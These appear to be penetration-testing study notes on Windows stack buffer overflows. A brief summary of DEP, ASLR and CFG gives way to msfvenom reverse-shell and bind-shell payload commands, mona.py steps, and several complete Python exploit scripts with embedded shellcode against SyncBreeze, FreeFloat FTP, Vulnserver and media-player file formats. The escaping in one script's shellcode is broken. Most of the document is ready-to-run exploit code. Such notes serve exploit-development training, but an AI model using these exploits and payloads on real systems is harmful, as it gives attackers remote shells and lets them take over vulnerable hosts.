# 	summary 

Several protection mechanisms have been designed to make EIP control more difficult to obtain or exploit.Microsoft implements several such protections, specifically *Data Execution Prevention* (DEP), Address Space Layout Randomization* (ASLR),and *Control Flow Guard* (CFG).

**DEP** is a set of hardware and software technologies that perform additional checks on memory to help prevent malicious code from running on a system. The primary benefit of DEP is to help prevent code execution from data pages by raising an exception when such attempts are made.

**ASLR** randomizes the base addresses of loaded applications and DLLs every time the operating system is booted. On older Windows operating systems like Windows XP where ASLR is not implemented, all DLLs are loaded at the same memory address every time, making exploitation much simpler. When coupled with DEP, ASLR provides a very strong mitigation against exploitation.

Finally, CFG, Microsoft’s implementation of *control-flow integrity*, performs validation of indirect code branching, preventing overwrites of function pointers.



We have three ways to detect low level vulnerabilities:

- Code Review
- Reverse Engineering
- Fuzzing



# Windows Buffer OverFlow

### Steps:

1. Determine length of overflow trigger w/ binary search "A"x1000
2. Determine exact EIP with `pattern_create.rb` & `pattern_offset.rb`
3. Determine badchars to make sure all of your payload is getting through 
4. Develop exploit

- Is the payload right at ESP
  - `JMP ESP`
- Is the payload before ESP
  - `sub ESP, 200` and then `JMP ESP`
  - or
  - `call [ESP-200]`



5. `msfvenom -a x86 --platform windows/linux -p something/shell/reverse_tcp lhost=x.x.x.x lport=53 -f exe/elf/python/perl/php -o filename`
6. Make sure it fits your payload length above
7. Gain shell, local priv esc or rooted already?

```bash
$ msf-pattern_create -l 800
 
 EIP=42306142
 
$ msf-pattern_offset -l 800 -q 42306142
 [*] Exact match at offset 780
```

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f c –e x 86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"

msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -b '\x00\x0a\x0d' -f c

msfvenom -p windows/console_bind_tcp LPORT=4444 -f python --platform win --arch x86 -b '\x00\x0a\x1a'

msfvenom -p windows/shell_reverse_tcp LHOST=your.Kali.IP.address LPORT=4444 EXITFUNC=thread -f c -a x86 –platform windows -b '\x00'

msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\3d"
```

 # Mona

Attack the process from immunity

```bash
!mona config -set workingfolder c:\logs\%p

!mona pattern_create 2000
!mona pattern_offset 37694136		 #260 + 4 for EIP + (2000-264)
----
push="A"*260        						#Found by mona.py 
eip ="BBBB"         						#more 4 bytes to overwrite EIP
junk="C"*1736       						#Later will replace this with real shellcode (1736 bytes 2000-264)
----
!mona jmp -r esp -o 						#Find JMP ESP address (0x6411a7ab) --> little endian 0x6411a7ab=xabxa7x11x64
OR
!mona modules										#Search for weak lib
!mona find -s ""\xff\xe4" -m "libspp.dll"   -- 10090C83   FFE4             JMP ESP
---
eip ="xabxa7x11x64"         #EIP
---
!mona bytearray -cpb "\x00\x01\xff"

```



# Exploiting Script for syncBreze 

```python
#!/usr/bin/python 
import socket 
import time 
import sys

try:
	print "\nSending evil buffer"
	buffer = ("Shell Code Here")
	filler = "A" * 780
	eip = "\x83\x0c\x09\x10"
	offset = "C" * 4
	nops = "\x90" * 10

	inputBuffer = filler + eip+offset+nops+buffer 
  
	content = "username=" + inputBuffer + "&password=A"
	buffer = "POST /login HTTP/1.1\r\n"
	buffer += "Host: 192.168.122.10\r\n"
	buffer += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0\r\n"
	buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
	buffer += "Accept-Language: en-US,en;q=0.5\r\n"
	buffer += "Accept-Encoding: gzip, deflate\r\n"
	buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
	buffer += "Content-Length: "+str(len(content))+"\r\n"
	buffer += "Origin: http://192.168.122.10\r\n"
	buffer += "Referer: http://192.168.122.10/login\r\n"
	buffer += "Upgrade-Insecure-Requests: 1\r\n"
	buffer += "\r\n"
	
	buffer += content
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(("192.168.122.10", 80)) 
	s.send(buffer)
	s.close()

except Exception as ex:
	print ex
	print "\nCould not connect!" 
	sys.exit()
```





# Freefloat FTP Server

```python
#!/usr/bin/env python
#-*- coding: utf-8 -*-

# Exploit Title: FreeFloat FTP Server HOST Command Buffer Overflow Exploit
# Date: 30/10/2016
# Exploit Author: Cybernetic
# Software Link:  http://www.freefloat.com/software/freefloatftpserver.zip
# Version: 1.00
# Tested on: Windows XP Profesional SP3 ESP x86
# CVE : N/A

import socket, os, sys
ret="\xC7\x31\x6B\x7E" #Shell32.dll 7E6B31C7

#Metasploit Shellcode
#msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -b '\x00\x0a\x0d' -f c

#nc -lvp 443
#Send exploit

shellcode=("\xbb\x89\x62\x48\xda\xdb\xda\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
"\x52\x31\x5a\x12\x03\x5a\x12\x83\x4b\x66\xaa\x2f\xb7\x8f\xa8"
"\xd0\x47\x50\xcd\x59\xa2\x61\xcd\x3e\xa7\xd2\xfd\x35\xe5\xde"
"\x76\x1b\x1d\x54\xfa\xb4\x12\xdd\xb1\xe2\x1d\xde\xea\xd7\x3c"
"\x5c\xf1\x0b\x9e\x5d\x3a\x5e\xdf\x9a\x27\x93\x8d\x73\x23\x06"
"\x21\xf7\x79\x9b\xca\x4b\x6f\x9b\x2f\x1b\x8e\x8a\xfe\x17\xc9"
"\x0c\x01\xfb\x61\x05\x19\x18\x4f\xdf\x92\xea\x3b\xde\x72\x23"
"\xc3\x4d\xbb\x8b\x36\x8f\xfc\x2c\xa9\xfa\xf4\x4e\x54\xfd\xc3"
"\x2d\x82\x88\xd7\x96\x41\x2a\x33\x26\x85\xad\xb0\x24\x62\xb9"
"\x9e\x28\x75\x6e\x95\x55\xfe\x91\x79\xdc\x44\xb6\x5d\x84\x1f"
"\xd7\xc4\x60\xf1\xe8\x16\xcb\xae\x4c\x5d\xe6\xbb\xfc\x3c\x6f"
"\x0f\xcd\xbe\x6f\x07\x46\xcd\x5d\x88\xfc\x59\xee\x41\xdb\x9e"
"\x11\x78\x9b\x30\xec\x83\xdc\x19\x2b\xd7\x8c\x31\x9a\x58\x47"
"\xc1\x23\x8d\xc8\x91\x8b\x7e\xa9\x41\x6c\x2f\x41\x8b\x63\x10"
"\x71\xb4\xa9\x39\x18\x4f\x3a\x86\x75\x4e\xde\x6e\x84\x50\x1f"
"\xd4\x01\xb6\x75\x3a\x44\x61\xe2\xa3\xcd\xf9\x93\x2c\xd8\x84"
"\x94\xa7\xef\x79\x5a\x40\x85\x69\x0b\xa0\xd0\xd3\x9a\xbf\xce"
"\x7b\x40\x2d\x95\x7b\x0f\x4e\x02\x2c\x58\xa0\x5b\xb8\x74\x9b"
"\xf5\xde\x84\x7d\x3d\x5a\x53\xbe\xc0\x63\x16\xfa\xe6\x73\xee"
"\x03\xa3\x27\xbe\x55\x7d\x91\x78\x0c\xcf\x4b\xd3\xe3\x99\x1b"
"\xa2\xcf\x19\x5d\xab\x05\xec\x81\x1a\xf0\xa9\xbe\x93\x94\x3d"
"\xc7\xc9\x04\xc1\x12\x4a\x34\x88\x3e\xfb\xdd\x55\xab\xb9\x83"
"\x65\x06\xfd\xbd\xe5\xa2\x7e\x3a\xf5\xc7\x7b\x06\xb1\x34\xf6"
"\x17\x54\x3a\xa5\x18\x7d")

shell= '\x90'*30 + shellcode
buffer='\x41'*247 + ret + shell + '\x43'*(696-len(shell))

print "Sending Buffer"

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect(('10.10.10.10',21))
s.recv(1024)
s.send('USER test \r\n')
s.recv(1024)
s.send('PASS test \r\n')
s.recv(1024)
s.send('HOST' +buffer+ '\r\n')
s.close()
print "Attack Buffer Overflow Successfully Executed"
```







```python
 1#!/usr/bin/python -w
 2
 3import struct
 4
 5#-------------------------------------------------------------------------------------------------------#
 6# msfvenom -p windows/console_bind_tcp LPORT=4444 -f python --platform win --arch x86 -b '\x00\x0a\x1a' #
 7#-------------------------------------------------------------------------------------------------------#
 8shellcode = ("\xbf\x11\xa0\x1c\x7c\xd9\xe9\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1"
 9"\x56\x83\xea\xfc\x31\x7a\x0f\x03\x7a\x1e\x42\xe9\x80\xc8\x0b"
10"\x12\x79\x08\x6c\x9a\x9c\x39\xbe\xf8\xd5\x6b\x0e\x8a\xb8\x87"
11"\xe5\xde\x28\x1c\x8b\xf6\x5f\x95\x26\x21\x51\x26\x87\xed\x3d"
12"\xe4\x89\x91\x3f\x38\x6a\xab\x8f\x4d\x6b\xec\xf2\xbd\x39\xa5"
13"\x79\x6f\xae\xc2\x3c\xb3\xcf\x04\x4b\x8b\xb7\x21\x8c\x7f\x02"
14"\x2b\xdd\x2f\x19\x63\xc5\x44\x45\x54\xf4\x89\x95\xa8\xbf\xa6"
15"\x6e\x5a\x3e\x6e\xbf\xa3\x70\x4e\x6c\x9a\xbc\x43\x6c\xda\x7b"
16"\xbb\x1b\x10\x78\x46\x1c\xe3\x02\x9c\xa9\xf6\xa5\x57\x09\xd3"
17"\x54\xb4\xcc\x90\x5b\x71\x9a\xff\x7f\x84\x4f\x74\x7b\x0d\x6e"
18"\x5b\x0d\x55\x55\x7f\x55\x0e\xf4\x26\x33\xe1\x09\x38\x9b\x5e"
19"\xac\x32\x0e\x8b\xd6\x18\x47\x78\xe5\xa2\x97\x16\x7e\xd0\xa5"
20"\xb9\xd4\x7e\x86\x32\xf3\x79\xe9\x69\x43\x15\x14\x91\xb4\x3f"
21"\xd3\xc5\xe4\x57\xf2\x65\x6f\xa8\xfb\xb0\x20\xf8\x53\x6a\x81"
22"\xa8\x13\xda\x69\xa3\x9b\x05\x89\xcc\x71\x30\x8d\x02\xa1\x11"
23"\x7a\x67\x55\x84\x26\xee\xb3\xcc\xc6\xa6\x6c\x78\x25\x9d\xa4"
24"\x1f\x56\xf7\x98\x88\xc0\x4f\xf7\x0e\xee\x4f\xdd\x3d\x43\xe7"
25"\xb6\xb5\x8f\x3c\xa6\xca\x85\x14\xa1\xf3\x4e\xee\xdf\xb6\xef"
26"\xef\xf5\x20\x93\x62\x92\xb0\xda\x9e\x0d\xe7\x8b\x51\x44\x6d"
27"\x26\xcb\xfe\x93\xbb\x8d\x39\x17\x60\x6e\xc7\x96\xe5\xca\xe3"
28"\x88\x33\xd2\xaf\xfc\xeb\x85\x79\xaa\x4d\x7c\xc8\x04\x04\xd3"
29"\x82\xc0\xd1\x1f\x15\x96\xdd\x75\xe3\x76\x6f\x20\xb2\x89\x40"
30"\xa4\x32\xf2\xbc\x54\xbc\x29\x05\x64\xf7\x73\x2c\xed\x5e\xe6"
31"\x6c\x70\x61\xdd\xb3\x8d\xe2\xd7\x4b\x6a\xfa\x92\x4e\x36\xbc"
32"\x4f\x23\x27\x29\x6f\x90\x48\x78")
33
34buffer = "A" * 260
35buffer += struct.pack('< L', 0x6405c20b) #jmp esp [MediaPlayerCtrl.dll]
36buffer += "\x90" * 32
37buffer += shellcode
38
39f = open("evil.plf","w")
40f.write(buffer)
41f.close()
```



# Aviosoft Digital TV Player Professional

```python
print "Creating expoit."
f=open("crash-me.PLF","w") #Create the file

push="x90"*260     #Found by mona.py 
eip ="xabxa7x11x64"         #EIP
junk="x90"*500     #500 nops before real shellcode

#msfpayload windows/exec cmd=calc R |msfencode -b "x00xffx0ax0dx1axff" -t c
shellcode=("xdaxdbxd9x74x24xf4x5bx31xc9xb1x32xb8x6exb9xe3"
"x05x31x43x17x83xc3x04x03x2dxaax01xf0x4dx24x4c"
"xfbxadxb5x2fx75x48x84x7dxe1x19xb5xb1x61x4fx36"
"x39x27x7bxcdx4fxe0x8cx66xe5xd6xa3x77xcbxd6x6f"
"xbbx4dxabx6dxe8xadx92xbexfdxacxd3xa2x0exfcx8c"
"xa9xbdx11xb8xefx7dx13x6ex64x3dx6bx0bxbaxcaxc1"
"x12xeax63x5dx5cx12x0fx39x7dx23xdcx59x41x6ax69"
"xa9x31x6dxbbxe3xbax5cx83xa8x84x51x0exb0xc1x55"
"xf1xc7x39xa6x8cxdfxf9xd5x4ax55x1cx7dx18xcdxc4"
"x7cxcdx88x8fx72xbaxdfxc8x96x3dx33x63xa2xb6xb2"
"xa4x23x8cx90x60x68x56xb8x31xd4x39xc5x22xb0xe6"
"x63x28x52xf2x12x73x38x05x96x09x05x05xa8x11x25"
"x6ex99x9axaaxe9x26x49x8fx06x6dxd0xb9x8ex28x80"
"xf8xd2xcax7ex3exebx48x8bxbex08x50xfexbbx55xd6"
"x12xb1xc6xb3x14x66xe6x91x76xe9x74x79x79")
shellcode+="x90"*900  #Okay, Need enough junk , so nops instead "A"

all=push+eip+junk+shellcode

try:   
    f.write(all)        
    f.close()
    print "File created"
except:
    print "File cannot be created"
```





# Vulnserver – TRUN command buffer overflow exploit

```python
#!/usr/bin/python

import socket
import os
import sys

host="192.168.2.135"
port=9999

buf =  ""
buf += "\xdb\xd1\xd9\x74\x24\xf4\x5a\x2b\xc9\xbd\x0e\x55\xbd"
buf += "\x38\xb1\x52\x31\x6a\x17\x83\xc2\x04\x03\x64\x46\x5f"
buf += "\xcd\x84\x80\x1d\x2e\x74\x51\x42\xa6\x91\x60\x42\xdc"
buf += "\xd2\xd3\x72\x96\xb6\xdf\xf9\xfa\x22\x6b\x8f\xd2\x45"
buf += "\xdc\x3a\x05\x68\xdd\x17\x75\xeb\x5d\x6a\xaa\xcb\x5c"
buf += "\xa5\xbf\x0a\x98\xd8\x32\x5e\x71\x96\xe1\x4e\xf6\xe2"
buf += "\x39\xe5\x44\xe2\x39\x1a\x1c\x05\x6b\x8d\x16\x5c\xab"
buf += "\x2c\xfa\xd4\xe2\x36\x1f\xd0\xbd\xcd\xeb\xae\x3f\x07"
buf += "\x22\x4e\x93\x66\x8a\xbd\xed\xaf\x2d\x5e\x98\xd9\x4d"
buf += "\xe3\x9b\x1e\x2f\x3f\x29\x84\x97\xb4\x89\x60\x29\x18"
buf += "\x4f\xe3\x25\xd5\x1b\xab\x29\xe8\xc8\xc0\x56\x61\xef"
buf += "\x06\xdf\x31\xd4\x82\xbb\xe2\x75\x93\x61\x44\x89\xc3"
buf += "\xc9\x39\x2f\x88\xe4\x2e\x42\xd3\x60\x82\x6f\xeb\x70"
buf += "\x8c\xf8\x98\x42\x13\x53\x36\xef\xdc\x7d\xc1\x10\xf7"
buf += "\x3a\x5d\xef\xf8\x3a\x74\x34\xac\x6a\xee\x9d\xcd\xe0"
buf += "\xee\x22\x18\xa6\xbe\x8c\xf3\x07\x6e\x6d\xa4\xef\x64"
buf += "\x62\x9b\x10\x87\xa8\xb4\xbb\x72\x3b\x7b\x93\x7e\x39"
buf += "\x13\xe6\x7e\x2c\xb8\x6f\x98\x24\x50\x26\x33\xd1\xc9"
buf += "\x63\xcf\x40\x15\xbe\xaa\x43\x9d\x4d\x4b\x0d\x56\x3b"
buf += "\x5f\xfa\x96\x76\x3d\xad\xa9\xac\x29\x31\x3b\x2b\xa9"
buf += "\x3c\x20\xe4\xfe\x69\x96\xfd\x6a\x84\x81\x57\x88\x55"
buf += "\x57\x9f\x08\x82\xa4\x1e\x91\x47\x90\x04\x81\x91\x19"
buf += "\x01\xf5\x4d\x4c\xdf\xa3\x2b\x26\x91\x1d\xe2\x95\x7b"
buf += "\xc9\x73\xd6\xbb\x8f\x7b\x33\x4a\x6f\xcd\xea\x0b\x90"
buf += "\xe2\x7a\x9c\xe9\x1e\x1b\x63\x20\x9b\x2b\x2e\x68\x8a"
buf += "\xa3\xf7\xf9\x8e\xa9\x07\xd4\xcd\xd7\x8b\xdc\xad\x23"
buf += "\x93\x95\xa8\x68\x13\x46\xc1\xe1\xf6\x68\x76\x01\xd3"

# 77A373CD   FFE4             JMP ESP

buffer = "TRUN /.:/" + "A" * 2003 + "\xcd\x73\xa3\x77" + "\x90" * 16 +  buf + "C" * (5060 - 2003 - 4 - 16 - len(buf))

expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect((host, port))
expl.send(buffer)
expl.close()
```

